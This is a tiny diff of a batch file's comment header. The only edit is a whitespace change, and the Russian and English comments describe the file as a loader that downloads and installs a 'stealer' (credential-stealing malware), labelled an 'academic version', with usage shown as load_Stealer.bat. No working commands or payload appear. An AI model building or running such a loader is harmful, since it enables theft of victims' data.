@@ -1,5 +1,5 @@
 rem ***************************************************************************
-rem Load Stealer from Web 
+rem Load Stealer from Web
 rem Файл загрузки и установки стайлера (Академический вариант)
 rem USAGE
 rem > load_Stealer.bat
